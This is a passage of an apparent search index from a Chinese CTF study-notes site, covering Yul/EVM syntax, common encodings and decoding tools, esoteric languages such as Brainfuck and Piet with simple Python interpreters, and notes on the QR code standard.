<li>\u8fd4\u56de\u503c\u76f4\u63a5\u5199\u5728 -&gt; \u540e\u9762</li> <li>\u53ea\u5728\u5b9a\u4e49\u7684\u5927\u62ec\u53f7\u5185\u6709\u6548</li> <li>\u901a\u8fc7 leave \u5173\u952e\u5b57\u6765\u9000\u51fa\u5f53\u524d\u51fd\u6570<ul> <li>\u6b64\u65f6\u8fd4\u56de\u503c\u76f4\u63a5\u4f7f\u7528\u5f53\u524d\u8fd4\u56de\u53d8\u91cf\u4e2d\u73b0\u6709\u7684\u503c</li> <li>return \u662f\u4e00\u4e2a EVM \u6307\u4ee4\uff0c\u7528\u4e8e\u9000\u51fa\u5f53\u524d\u6267\u884c\u4e0a\u4e0b\u6587\uff08\u5185\u90e8\u6d88\u606f\u8c03\u7528\uff09\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u5f53\u524d\u51fd\u6570</li> </ul> </li> <li>\u6b64\u65f6\u5b9a\u4e49\u7684\u51fd\u6570\u53ea\u662f\u4e00\u4e2a\u666e\u901a\u7684\u53ef\u4ee5\u5185\u90e8\u8c03\u7528\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f solidity \u4e2d\u53ef\u4f9b\u5916\u90e8\u8c03\u7528\u7684\u5408\u7ea6\u63a5\u53e3</li> <li>\u51fd\u6570\u5b9a\u4e49\u5728\u6574\u4e2a\u5757\uff08\u5927\u62ec\u53f7\uff09\u4e2d\u53ef\u89c1\uff08\u5373\u4f7f\u5728\u5b9a\u4e49\u4e4b\u524d\uff09</li> <li>\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u5fc5\u987b\u4e0d\u540c</li> <li>\u51fd\u6570\u5185\u90e8\u4e0d\u80fd\u4f7f\u7528\u51fd\u6570\u5916\u7684\u53d8\u91cf</li> </ul> </li> <li>\u51fd\u6570\u8c03\u7528<ul> <li>\u6b63\u5e38\u901a\u8fc7\u62ec\u53f7\u8c03\u7528</li> </ul> </li> <li>\u4f8b\u5982\uff1a     <pre><code>mstore(0x80, add(mload(0x80), 3))\n</code></pre><ul> <li>\u53ef\u4ee5\u76f4\u63a5\u88ab\u7ffb\u8bd1\u4e3a <code>PUSH1 3 PUSH1 0x80 MLOAD ADD PUSH1 0x80 MSTORE</code> <pre><code>function f(x, y) -&gt; a, b { ... }\nlet x, y := f(1, mload(0))\n</code></pre></li> <li>\u53c2\u6570\u4ece\u53f3\u5411\u5de6\u4f20\u5165\uff08\u5148\u5c06\u53f3\u4fa7\u7684\u538b\u5165\u6808\uff09</li> <li>\u8fd4\u56de\u503c\u53f3\u4fa7\u7684\u5728\u6808\u9876</li> </ul> </li> <li>\u5185\u7f6e EVM \u51fd\u6570<ul> <li>\u4e00\u822c\u4e3a EVM \u6307\u4ee4\u540d\u5c0f\u5199\uff0c\u53c2\u6570\u4e5f\u4e0e EVM \u6307\u4ee4\u7684\u6808\u8f93\u5165\u4e00\u81f4\uff08\u6808\u9876\u5728\u53c2\u6570\u5217\u8868\u5de6\u4fa7\uff09</li> <li>\u4e00\u4e9b\u7a0d\u6709\u4e0d\u540c\u7684\uff1a<ul> <li>SHA3 \u6307\u4ee4\uff0c\u5bf9\u5e94\u51fd\u6570\u540d\u4e3a keccak256</li> <li>\u6ca1\u6709\u63d0\u4f9b jump \u7cfb\u5217\u6307\u4ee4\uff08JUMP\u3001JUMPI\u3001JUMPDEST\uff09\u56e0\u4e3a\u4f1a\u6df7\u6dc6\u63a7\u5236\u6d41</li> <li>\u6ca1\u6709\u63d0\u4f9b DUP\u3001SWAP\u3001PUSH \u7cfb\u5217\u6307\u4ee4\uff0c\u56e0\u4e3a\u4f1a\u6df7\u6dc6\u6808\u64cd\u4f5c</li> <li>\u63d0\u4f9b\u4e86\u4e00\u4e2a invalid() \u51fd\u6570\u6765\u4ece\u672a\u77e5\u6307\u4ee4\u7ec8\u6b62\u6267\u884c</li> </ul> </li> </ul> </li> <li>\u5176\u5b83\u5185\u7f6e\u51fd\u6570<ul> <li>datasize(x): \u8fd4\u56de Yul object \u4e2d\u67d0\u90e8\u5206\u7684\u6570\u636e\u5927\u5c0f</li> <li>dataoffset(x): \u5728\u5b57\u8282\u7801\u4e2d\u7684\u504f\u79fb\u91cf</li> <li>datacopy(t, f, l): \u590d\u5236\u5230\u5185\u5b58\u4e2d\uff08\u7b49\u4ef7\u4e8e codecopy\uff09</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/yul/#yul_1","title":"Yul \u5bf9\u8c61","text":"<ul> <li>\u4e00\u4e2a Yul object \u81f3\u5c11\u7531\u4e00\u4e2a code \u5757\u7ec4\u6210\uff08\u800c\u4e14\u6700\u591a\u4e00\u4e2a code\uff09\uff0c\u8fd8\u53ef\u4ee5\u6709 data \u5757\u548c object \u5757\uff0c\u4f8b\u5982\uff1a     <pre><code>object \"object1\" {\n    code {\n        ...\n    }\n    object \"object2\" {\n        code {\n            ...\n        }\n    }\n    data \"data1\" hex\"...\"\n}\n</code></pre></li> <li>code \u5373\u6267\u884c\u7684\u4ee3\u7801\uff0cobject \u53ef\u4ee5\u770b\u6210\u5408\u7ea6\uff0c\u90a3\u4e48 code \u5c31\u662f constructor</li> <li>\u53eb\u505a \".metadata\" \u7684 data \u4e0d\u80fd\u4ece\u4ee3\u7801\u4e2d\u8bbf\u95ee\uff0c\u5b83\u4f1a\u76f4\u63a5\u9644\u52a0\u5728\u5b57\u8282\u7801\u7684\u6700\u672b\u5c3e</li> <li>\u4f8b\u5982\u4e00\u4e2a\u5408\u7ea6\u53ef\u4ee5\u5199\u4e3a\uff1a     <pre><code>object \"Contract\" {\n    code {\n        sstore(0, caller())\n        datacopy(0, dataoffset(\"runtime\"), datasize(\"runtime\"))\n        return(0, datasize(\"runtime\"))\n    }\n    object \"runtime\" {\n        code {\n            require(iszero(callvalue())) // not payable\n            switch selector()\n            case ... {\n                ...\n            }\n            case ... {\n\n            }\n            ...\n            default {\n                revert(0, 0) // no fallback function\n            }\n\n            function ...\n            ...\n        }\n    }\n}\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/yul/#_6","title":"\u7f16\u8bd1","text":"<p>Remix \u4e0a\u5c31\u53ef\u4ee5\u9009\u62e9\u7f16\u8bd1\u6e90\u8bed\u8a00\u4e3a Yul\u3002</p>"},{"location":"ctf/blockchain/solana/","title":"Solana","text":"<p>TODO</p>"},{"location":"ctf/misc/coding/","title":"\u7f16\u7801\u53ca\u53e4\u5178\u5bc6\u7801","text":"<p> \u7ea6 282 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u9898\u76ee\u4e2d\u4e5f\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u7f16\u7801\u548c\u53e4\u5178\u5bc6\u7801\u6709\u5173\u7684\u8fc7\u7a0b</p> <p>\u7f16\u7801\u9700\u8981\u6839\u636e\u7279\u5f81\u5224\u65ad\u51fa\u7f16\u7801\u65b9\u5f0f\uff0c\u53e4\u5178\u5bc6\u7801\u5219\u9700\u8981\u77e5\u9053\u5bc6\u94a5\u6765\u89e3\u5bc6</p>"},{"location":"ctf/misc/coding/#_2","title":"\u7f16\u7801","text":""},{"location":"ctf/misc/coding/#base64","title":"Base64","text":"<p>Base64 \u662f\u5c063\u4e2a8\u4f4d\u8f6c\u4e3a4\u4e2a6\u4f4d\u4e8c\u8fdb\u5236\u6570\u7684\u7f16\u7801\u65b9\u6cd5\u3002\u5982\u679c\u7f16\u7801\u540e\u4e0d\u4e3a4\u7684\u500d\u6570\u5219\u8865<code>=</code>\uff0c\u6240\u4ee5\u7279\u5f81\u662f\u7ed3\u5c3e\u4f1a\u6709 0-2 \u4e2a <code>=</code> \u5e76\u4e146\u4f4d\u4e8c\u8fdb\u5236\u6570\u4f1a\u88ab\u6620\u5c04\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5206\u522b\u662f <code>A-Za-z0-9+/</code> 63\u4e2a\u5b57\u7b26\uff0c\u7b97 <code>=</code> 64\u4e2a</p>"},{"location":"ctf/misc/coding/#base","title":"Base\u7cfb\u5217","text":"\u7f16\u7801\u65b9\u5f0f \u7279\u5f81 \u5b57\u7b26\u96c6 Base100 \u7f16\u7801\u4e3a emoji Base85 \u7279\u6b8a\u5b57\u7b26\u591a <code>0-9A-Za-z!#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~</code> Base64 \u7ed3\u5c3e\u4f1a\u67090-2\u4e2a\u7b49\u53f7 <code>A-Za-z0-9+/</code> Base58 \u6ca1\u6709\u7279\u6b8a\u5b57\u7b26\u3001\u6ca1\u6709<code>0OIl</code> <code>1-9A-HJ-NP-Za-km-z</code> Base36 <code>0-9A-Z</code> Base32 \u7ed3\u5c3e\u4f1a\u6709\u8f83\u591a\u7b49\u53f7 <code>A-Z2-7</code> Base16 \u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u4e32 <code>0-9A-F</code> <p>\u5de5\u5177\uff1a mufeedvh/basecrack</p>"},{"location":"ctf/misc/coding/#xxencode-uuencode","title":"xxencode &amp; uuencode","text":"<p>\u7c7b\u4f3c Base64</p> <ul> <li>xxencode \u5b57\u7b26\u96c6\uff1a<code>+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code></li> <li>uuencode \u5b57\u7b26\u96c6\uff1a<code>!\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_</code> \u7a7a\u683c\u53ef\u80fd\u4f1a\u6539\u4e3a <code>`</code></li> </ul> <p>\u5de5\u5177\uff1apython <code>codecs.encode / codecs.decode</code></p>"},{"location":"ctf/misc/coding/#unicode","title":"Unicode","text":"<ul> <li>https://home.unicode.org/</li> <li>https://tool.chinaz.com/Tools/Unicode.aspx</li> </ul>"},{"location":"ctf/misc/coding/#emojis","title":"Emojis","text":"<ul> <li>https://www.emojiall.com/zh-hans</li> <li>emoji-aes\uff08\u9700\u8981 key\uff09\uff0c\u7279\u5f81\uff1a\ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\u7b49\u5f00\u5934</li> </ul>"},{"location":"ctf/misc/coding/#_3","title":"\u5de5\u5177","text":"<ul> <li>DenCode\uff1ahttps://dencode.com/</li> <li>Ciphey\uff1a Ciphey/Ciphey</li> <li>CyberChef\uff1ahttps://gchq.github.io/CyberChef/</li> <li>emoji-aes\uff1ahttps://aghorler.github.io/emoji-aes/</li> <li>tool box\uff1ahttp://www.hiencode.com/</li> </ul>"},{"location":"ctf/misc/coding/#_4","title":"\u5176\u4ed6\u7f16\u7801","text":"<ul> <li>\u76f2\u6587\u6570\u5b66\uff1ahttps://nemeth.aphtech.org/</li> <li>\u4e09\u8bcd\u5730\u5740\uff1ahttps://map.what3words.com/</li> </ul>"},{"location":"ctf/misc/coding/#_5","title":"\u53e4\u5178\u5bc6\u7801","text":""},{"location":"ctf/misc/esolang/","title":"Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00","text":"<p> \u7ea6 274 \u4e2a\u5b57  106 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>An esoteric programming language, or esolang, is a computer programming language designed to experiment with weird ideas, to be hard to program in, or as a joke, rather than for practical use. \u2014\u2014\u2014\u2014 esolang wiki</p> <p>Abstract</p> <p>\u6b64\u5904\u6574\u7406\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u8005\u6b63\u5e38\u7f16\u7a0b\u8bed\u8a00\u7684\u7279\u6b8a\u4f7f\u7528\u65b9\u6cd5\uff0c\u591a\u89c1\u4e8eMisc\u9898\u4e2d\uff0c\u4f46\u662f\u6b64\u9875\u9762\u4e5f\u4ec5\u662f\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u89c1\u7684 Esolang\u548c\u5df2\u7ecf\u9047\u5230\u8fc7\u7684Esolang\uff0c\u9898\u76ee\u4e2d\u9047\u5230\u8fd8\u662f\u8981\u968f\u673a\u5e94\u53d8\uff0c\u5584\u7528\u641c\u7d22</p> <p>Esolang, the esoteric programming languages wiki</p>"},{"location":"ctf/misc/esolang/#_1","title":"\u6781\u5c0f\u8bed\u8a00","text":"<p>\u6781\u5c0f\u8bed\u8a00\u6307\u7684\u662f\u6307\u4ee4\u6570\u5f88\u5c11\u7684\u4e00\u79cd Esolang</p>"},{"location":"ctf/misc/esolang/#brainfuck","title":"BrainFuck","text":"<p>\u7279\u5f81\uff1a\u5305\u542b <code>&gt;&lt;+-.,[]</code> \u516b\u4e2a\u6307\u4ee4\uff0c\u5177\u6709\u56fe\u7075\u5b8c\u5907\u6027</p> \u6307\u4ee4 \u542b\u4e49 &gt; \u6307\u9488\u52a0\u4e00\uff08\u53f3\u79fb\u4e00\u4f4d\uff09 &lt; \u6307\u9488\u51cf\u4e00\uff08\u5de6\u79fb\u4e00\u4f4d\uff09 + \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u52a0\u4e00 - \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u51cf\u4e00 . \u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u5185\u5bb9\uff08ASCII\u7801\uff09 , \u8f93\u5165\u5185\u5bb9\u5230\u6307\u9488\u6307\u5411\u7684\u5355\u5143\uff08ASCII\u7801\uff09 [ \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e3a\u96f6\uff0c\u5411\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 ] \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 ] \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e0d\u4e3a\u96f6\uff0c\u5411\u524d\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 [ \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 \u5176\u5b83 \u76f4\u63a5\u5ffd\u7565 <p>e.g. <code>++++++++ [&gt;++++++++++++&gt;+++++++++++++&lt;&lt;-] &gt;++++. -. &gt;+++++++. &lt;+. +.</code></p> BrainFuck \u89e3\u91ca\u5668 <pre><code>import sys\n\ndef Brainfuck(code):\n    code = ''.join(filter(lambda x: x in ['.', ',', '[', ']', '&lt;', '&gt;', '+', '-'], code))\n    bracemap = buildbracemap(code)\n\n    cells, codeptr, cellptr = [0], 0, 0\n    result = ''\n\n    while codeptr &lt; len(code):\n        command = code[codeptr]\n        if command == \"&gt;\":\n            cellptr += 1\n            if cellptr == len(cells): cells.append(0)\n        elif command == \"&lt;\": cellptr = 0 if cellptr &lt;= 0 else cellptr - 1\n        elif command == \"+\": cells[cellptr] = cells[cellptr] + 1 if cells[cellptr] &lt; 255 else 0\n        elif command == \"-\": cells[cellptr] = cells[cellptr] - 1 if cells[cellptr] &gt; 0 else 255\n        elif command == \"[\" and cells[cellptr] == 0: codeptr = bracemap[codeptr]\n        elif command == \"]\" and cells[cellptr] != 0: codeptr = bracemap[codeptr]\n        elif command == \".\": result += chr(cells[cellptr])\n        elif command == \",\": cells[cellptr] = ord(input(\"[*] input one char &gt; \"))\n        codeptr += 1\n\n    print(f\"[+] Result: {result}\")\n\ndef buildbracemap(code):\n    temp_bracestack, bracemap = [], {}\n    for position, command in enumerate(code):\n        if command == \"[\": temp_bracestack.append(position)\n        if command == \"]\":\n            start = temp_bracestack.pop()\n            bracemap[start] = position\n            bracemap[position] = start\n    return bracemap\n\nif __name__ == \"__main__\":\n    code = input(\"[*] Input brainfuck code &gt; \")\n    Brainfuck(code)\n</code></pre> <ul> <li>\u53ef\u89c6\u5316\u6267\u884c\uff1ahttp://fatiherikli.github.io/brainfuck-visualizer/</li> <li>Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr)</li> <li>Marcos Minond</li> </ul> <p>\u53e6\u6709\u4f17\u591a\u53d8\u79cd\uff0c\u5982 Ook!\uff0cBrainfuck+3\uff0c*brainfuck \u7b49</p> <p>\u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u6709\u7684 brainfuck \u4ee3\u7801\u4f1a\u5411\u5de6\u8d8a\u754c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u628a\u89e3\u91ca\u5668\u7684\u521d\u59cb\u4f4d\u7f6e\u5f80\u540e\u79fb\u4e00\u4e0b\uff08\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u9884\u5148\u6269\u5145 <code>cells</code>\uff0c\u7136\u540e\u4ee4\u8d77\u59cb\u7684 <code>cellptr</code> \u5927\u4e8e0\uff09</p>"},{"location":"ctf/misc/esolang/#ook","title":"Ook!","text":"<p>\u7279\u5f81\uff1a\u5168\u662f Ook</p> <p>Ook! Programming Language - Esoteric Code Decoder, Encoder, Translator (dcode.fr)</p>"},{"location":"ctf/misc/esolang/#_2","title":"\u56fe\u5f62\u5316\u8bed\u8a00","text":"<p>\u56fe\u5f62\u5316\u8bed\u8a00\u662f\u7528\u4e00\u4e9b\u50cf\u7d20\u56fe\u6784\u5efa\u6781\u5c0f\u8bed\u8a00\u7684 Esolang\uff0c\u6700\u4e3a\u8457\u540d\u7684\u662f Piet</p>"},{"location":"ctf/misc/esolang/#piet","title":"Piet","text":"<p>\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670920\u79cd\u989c\u8272\uff1a</p> <pre><code>#FFC0C0 #FFFFC0 #C0FFC0 #C0FFFF #C0C0FF #FFC0FF\n#FF0000 #FFFF00 #00FF00 #00FFFF #0000FF #FF00FF\n#C00000 #C0C000 #00C000 #00C0C0 #0000C0 #C000C0\n#FFFFFF #000000 \n</code></pre> <p>\u4ec5\u7531 <code>00\u3001C0\u3001FF</code> \u6784\u6210\uff0c\u4f8b\u5982\uff1a</p> <p></p> <ul> <li> <p>DM's Esoteric Programming Languages - Piet (dangermouse.net)</p> </li> <li> <p>DM's Esoteric Programming Languages - Piet Samples (dangermouse.net)</p> </li> </ul> <p>\u53e6\u8fd8\u6709\u4e00\u4e9b\u4e9b\u53d8\u79cd\uff0c\u5982 Piet-Q</p>"},{"location":"ctf/misc/esolang/#brainloller","title":"Brainloller","text":"<p>\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670910\u79cd\u989c\u8272\uff0c\u5176\u4e2d8\u79cd\u5bf9\u5e94 BF \u76848\u4e2a\u6307\u4ee4\uff0c2\u79cd\u5bf9\u5e94\u6307\u9488\u65cb\u8f6c\u6307\u4ee4\uff0c\u4e14\u4ec5\u7531 <code>00\u300180\u3001FF</code>\u6784\u6210</p> \u989c\u8272 hex \u503c rgb \u503c \u542b\u4e49 \u7ea2 #FF0000 (255, 0, 0) &gt; \u6df1\u7ea2 #800000 (128, 0, 0) &lt; \u7eff #00FF00 (0, 255, 0) + \u6df1\u7eff #008000 (0, 128, 0) - \u84dd #0000FF (0, 0, 255) . \u6df1\u84dd #000080 (0, 0, 128) , \u9ec4 #FFFF00 (255, 255, 0) [ \u6df1\u9ec4 #808000 (128, 128, 0) ] \u9752 #00FFFF (0, 255, 255) IP\u987a\u65f6\u948890\u00b0 \u6df1\u9752 #008080 (0, 128, 128) IP\u9006\u65f6\u948890\u00b0 <p>\u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL </p> <ul> <li>Marcos Minond</li> </ul> Brainloller \u89e3\u91ca\u5668 <pre><code>from PIL import Image \nimport sys\n\ndef Brainloller(filename):\n    source = Image.open(filename).convert(\"RGB\")\n    width, height = source.size\n    result = ''\n    ptr = (0, 0)\n    direction = 0\n    while True:\n        if ptr[0] &gt;= height or ptr[0] &lt; 0 or ptr[1] &gt;= width or ptr[1] &lt; 0:\n            break\n        else:\n            color = source.getpixel((ptr[1], ptr[0]))\n            if   color == (255,   0,   0): result += '&gt;'\n            elif color == (128,   0,   0): result += '&lt;'\n            elif color == (  0, 255,   0): result += '+'\n            elif color == (  0, 128,   0): result += '-'\n            elif color == (  0,   0, 255): result += '.'\n            elif color == (  0,   0, 128): result += ','\n            elif color == (255, 255,   0): result += '['\n            elif color == (128, 128,   0): result += ']'\n            elif color == (  0, 255, 255): direction = (direction + 1) % 4\n            elif color == (  0, 128, 128): direction = (direction - 1) % 4\n            else: print(f\"[-] Unknown color: {color}\")\n        if   direction == 0: ptr = ptr[0], ptr[1] + 1\n        elif direction == 1: ptr = ptr[0] + 1, ptr[1]\n        elif direction == 2: ptr = ptr[0], ptr[1] - 1\n        elif direction == 3: ptr = ptr[0] - 1, ptr[1]\n\n    print(f\"[+] BrainFuck Code: {result}\")\n    return result\n\ndef Brainfuck(code):\n    code = ''.join(filter(lambda x: x in ['.', ',', '[', ']', '&lt;', '&gt;', '+', '-'], code))\n    bracemap = buildbracemap(code)\n\n    cells, codeptr, cellptr = [0], 0, 0\n    result = ''\n\n    while codeptr &lt; len(code):\n        command = code[codeptr]\n        if command == \"&gt;\":\n            cellptr += 1\n            if cellptr == len(cells): cells.append(0)\n        elif command == \"&lt;\": cellptr = 0 if cellptr &lt;= 0 else cellptr - 1\n        elif command == \"+\": cells[cellptr] = cells[cellptr] + 1 if cells[cellptr] &lt; 255 else 0\n        elif command == \"-\": cells[cellptr] = cells[cellptr] - 1 if cells[cellptr] &gt; 0 else 255\n        elif command == \"[\" and cells[cellptr] == 0: codeptr = bracemap[codeptr]\n        elif command == \"]\" and cells[cellptr] != 0: codeptr = bracemap[codeptr]\n        elif command == \".\": result += chr(cells[cellptr])\n        elif command == \",\": cells[cellptr] = ord(input(\"[*] input one char &gt; \"))\n        codeptr += 1\n\n    print(f\"[+] Result: {result}\")\n\ndef buildbracemap(code):\n    temp_bracestack, bracemap = [], {}\n    for position, command in enumerate(code):\n        if command == \"[\": temp_bracestack.append(position)\n        if command == \"]\":\n            start = temp_bracestack.pop()\n            bracemap[start] = position\n            bracemap[position] = start\n    return bracemap\n\nif __name__ == \"__main__\":\n    Brainfuck(Brainloller(sys.argv[1]))\n</code></pre>"},{"location":"ctf/misc/esolang/#_3","title":"\u7279\u6b8a\u5173\u952e\u5b57\u8bed\u8a00","text":""},{"location":"ctf/misc/esolang/#lolcode","title":"LOLcode","text":"<p>\u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL </p> <p>LOLCODE Language - Compiler - Online Decoder, Encoder, Translator</p>"},{"location":"ctf/misc/qrcode/","title":"\u4e8c\u7ef4\u7801 QRCode \u6807\u51c6\u9605\u8bfb","text":"<p> \u7ea6 6170 \u4e2a\u5b57  13 \u884c\u4ee3\u7801  16 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 21 \u5206\u949f</p> <p>\u6700\u8fd1\u51e0\u6b21\u6bd4\u8d5b\u9047\u5230\u8fc7\u597d\u51e0\u6b21\u4e8c\u7ef4\u7801\u7684\u9898\u76ee\uff0c\u6253\u7b97\u597d\u597d\u6765\u8bfb\u4e00\u8bfb\u6807\u51c6\u6587\u6863 ISO/IEC 18004:2015 \u6587\u6863 6.1 \u524d\u9762\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u5c31\u4ece\u5b83\u540e\u9762\u5f00\u59cb\u8bb0\u4e86</p>"},{"location":"ctf/misc/qrcode/#6163","title":"\u57fa\u7840\u63cf\u8ff0\u53ca\u7ed3\u6784\uff086.1\u30016.3\uff09","text":""},{"location":"ctf/misc/qrcode/#5361","title":"\u57fa\u7840\u63cf\u8ff0\uff085.3\u30016.1\uff09","text":"<ul> <li>\u5757\u4f4d\u7f6e\uff1a\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9 (0, 0) \u5411\u4e0bx+\uff0c\u5411\u53f3y+</li> <li>\u7248\u672c\u8868\u793a\uff1aVersion V-E\uff08\u5176\u4e2dV\u662f\u7248\u672c\u53f7\uff0cE\u662f\u7ea0\u9519\u7b49\u7ea7\uff09</li> <li>\u6570\u636e\u8868\u793a\uff1a\u9ed1\u5757-1 \u767d\u5757-0\uff08\u53ef\u4ee5\u5e26\u80cc\u666f\u5168\u90e8\u53cd\u8272\uff09</li> <li>\u5927\u5c0f\uff1a\u4ece\u7248\u672c1\u5230\u7248\u672c40\u4f9d\u6b21\u662f 21x21 \uff5e 177x177\uff08\u6bcf\u589e\u52a0\u4e00\u4e2a\u7248\u672c\uff0c\u8fb9\u957f\u589e\u52a04\uff09</li> <li>\u652f\u6301\u7684\u6700\u591a\u5b57\u7b26\u6570\uff08\u7248\u672c40\uff09<ul> <li>\u6570\u5b57\u6a21\u5f0f\uff1a7089</li> <li>\u5b57\u6bcd\u6a21\u5f0f\uff1a4296</li> <li>\u5b57\u8282\u6a21\u5f0f\uff1a2953</li> <li>\u65e5\u6587\u6a21\u5f0f\uff1a1817</li> </ul> </li> <li>\u7ea0\u9519\u7b49\u7ea7\u5141\u8bb8\u7684\u6062\u590d\u6bd4\u4f8b<ul> <li>L\uff1a7%</li> <li>M\uff1a15%</li> <li>Q\uff1a25%</li> <li>H\uff1a30%</li> </ul> </li> </ul>"},{"location":"ctf/misc/qrcode/#63","title":"\u4e8c\u7ef4\u7801\u7ed3\u6784\uff086.3\uff09","text":"<ul> <li>\u529f\u80fd\u56fe\u6848\uff08function patterns\uff09<ul> <li>\u7279\u5f81\u7b26\uff08finder pattern\uff097x7\u9ed1\u5708 5x5\u767d\u5708 3x3\u9ed1\u5757</li> <li>\u5206\u5272\u7ebf\uff08separator\uff09\u5728\u7279\u5f81\u7b26\u5468\u56f4\u7684\u4e00\u5708\u5168\u767d\u533a\u57df</li> <li>\u65f6\u5e8f\u56fe\u6848\uff08timing patterns\uff09\u7b2c7\u884c\u7b2c7\u5217\u7684\u4e24\u6761\u9ed1\u767d\u6761\u7eb9</li> <li>\u5bf9\u9f50\u56fe\u6848\uff08alignment patterns\uff09\u7248\u672c1\u65e0\uff0c\u7248\u672c2-6 1\u4e2a\uff0c\u7248\u672c7-13 6\u4e2a\u2026\u2026\uff08\u9644\u5f55E\uff09</li> <li>\u9759\u9ed8\u533a\uff08quiet zone\uff09\u81f3\u5c114\u4e2a\u5355\u4f4d\u5bbd</li> </ul> </li> <li>\u7f16\u7801\u533a\u57df\uff08encoding region\uff09<ul> <li>\u683c\u5f0f\u4fe1\u606f\uff08format information\uff09\u5de6\u4e0a\u89d2\u5206\u5272\u7ebf\u5916\u4e00\u5708\uff0c\u5de6\u4e0b\u89d2\u5206\u5272\u7ebf\u53f3\u4fa7\uff0c\u53f3\u4e0a\u89d2\u5206\u5272\u7ebf\u4e0b\u4fa7</li> <li>\u7248\u672c\u4fe1\u606f\uff08version information\uff09\u7248\u672c7\u540e\u624d\u6709\uff0c\u5728\u5de6\u4e0b\u5206\u5272\u7ebf\u4e0a\u4fa7\uff0c\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7</li> <li>\u6570\u636e\u53ca\u7ea0\u9519\u7801\u533a\u57df</li> </ul> </li> </ul>"},{"location":"ctf/misc/qrcode/#74","title":"\u6570\u636e\u7f16\u7801\uff087.4\uff09","text":""},{"location":"ctf/misc/qrcode/#741","title":"\u6570\u636e\u5e8f\u5217\uff087.4.1\uff09","text":"<p>\u9ed8\u8ba4\u7684 ECI \u6a21\u5f0f\u4e0b\uff0c\u6bd4\u7279\u6d41\u4ee5\u6a21\u5f0f\u6807\u8bc6\u7b26\u5f00\u59cb\u3002\u5982\u679c\u4e0d\u662f\u9ed8\u8ba4 ECI \u6a21\u5f0f\uff0c\u5219\u9700\u8981\u4ece ECI \u5934\u5f00\u59cb\uff1a</p> <ul> <li>\uff084 bits\uff09ECI \u6a21\u5f0f\u6807\u8bc6\u7b26</li> <li>\uff088/16/24 bits\uff09ECI Designator</li> </ul> <p>\u6bd4\u7279\u6d41\u7684\u5269\u4f59\u90e8\u5206\u7531\u4e0b\u9762\u51e0\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>\uff084 bits\uff09\u6a21\u5f0f\u6807\u8bc6\u7b26</li> <li>\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u89c1\u4e0b\u7b2c\u4e8c\u4e2a\u8868\uff09</li> <li>\u6570\u636e\u6bd4\u7279\u6d41</li> </ul> \u6a21\u5f0f \u6807\u8bc6\u7b26 \u8bf4\u660e ECI 0111 \u6570\u5b57\u6a21\u5f0f 0001 \u53ea\u5305\u542b\u6570\u5b570-9\uff0c3\u4e2a\u6570\u5b57 10 bits \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f 0010 45\u4e2a\u5b57\u7b26\uff0c0-9A-Z \u53ca9\u4e2a\u7b26\u53f7 \u7a7a\u683c$%*+-./:\uff0c2\u4e2a\u5b57\u7b26 11 bits \u5b57\u8282\u6a21\u5f0f 0100 \u6bcf\u4e2a\u5b57\u7b26 8 bits \u65e5\u672c\u6c49\u5b57\u6a21\u5f0f 1000 \u7ed3\u6784\u6dfb\u52a0\u6a21\u5f0f 0011 \u7248\u672c \u6570\u5b57\u6a21\u5f0f\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6 \u5b57\u6bcd\u6a21\u5f0f\u2026\u2026 \u5b57\u8282\u6a21\u5f0f\u2026\u2026 